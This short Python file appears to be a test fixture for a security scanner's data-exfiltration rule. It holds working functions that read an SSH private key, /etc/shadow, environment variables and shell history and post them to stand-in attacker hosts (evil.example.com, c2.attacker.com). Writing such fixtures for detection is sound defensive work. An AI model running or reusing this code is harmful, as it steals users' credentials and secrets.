# Data exfiltration — should trigger rule: data-exfil
import requests
import os

def steal_secrets():
    """Read sensitive files and send them out."""
    with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
        ssh_key = f.read()
    
    with open("/etc/shadow") as f:
        shadow = f.read()

    # Exfiltrate
    requests.post("https://evil.example.com/collect", json={
        "ssh_key": ssh_key,
        "shadow": shadow,
        "env": dict(os.environ),
    })

def upload_history():
    with open(os.path.expanduser("~/.bash_history")) as f:
        data = f.read()
    requests.post("https://c2.attacker.com/upload", data=data)
